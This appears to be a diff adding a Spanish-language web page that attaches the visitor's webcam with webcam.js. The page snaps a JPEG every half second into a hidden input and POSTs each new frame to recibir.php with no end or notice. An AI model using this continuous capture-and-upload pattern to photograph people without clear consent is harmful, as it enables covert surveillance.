@@ -1,0 +1,69 @@
+<html>
+	<head>
+		<script src="jquery.js"></script>
+		<script src="webcam.js"></script>
+	</head>
+	<body>
+		<div id="id-camara">													
+		</div>
+		<input type="hidden" id="ImagenEscondida" value="">
+	</body>
+	<script>
+		if($('#id-camara').length>0)
+		{
+			var ancho = $('#div-ancho-camara').width();
+			var alto = (ancho*240) /320;
+			ancho = 480;
+			alto = 360;
+			Webcam.set({
+				width: ancho,
+				height: alto,
+				image_format: 'jpeg',
+				jpeg_quality: 100
+			});
+			Webcam.attach( '#id-camara' );
+		}
+		
+		function TomarFoto()
+		{
+			Webcam.snap( function(data_uri) {
+				$('#ImagenEscondida').val(data_uri);
+			});
+		}
+		
+		var hola = 0;
+		var comienzo = '';
+		function EnviarFoto()
+		{
+			if(hola<1000)
+			{
+				TomarFoto();
+				if($('#ImagenEscondida').val() != comienzo)
+				{
+					var g = new Date();
+					var mili = g.getMilliseconds(); 
+					var segundos = g.getSeconds();
+					var minutos  = g.getMinutes();
+					var horas = g.getHours();
+					var s = horas+''+minutos+''+segundos+''+mili;
+					comienzo = $('#ImagenEscondida').val();
+					var form_data = {
+						hora: s,
+						is_ajax: 1,
+						imagen: comienzo
+					};					
+					$.ajax({	
+						type: "POST",
+						url: "recibir.php",
+						data: form_data,
+						success: function(response)
+						{
+							console.log(response);
+						}
+					});
+				}
+			}
+		}
+		setInterval(function(){ EnviarFoto(); },500);
+	</script>
+</html>
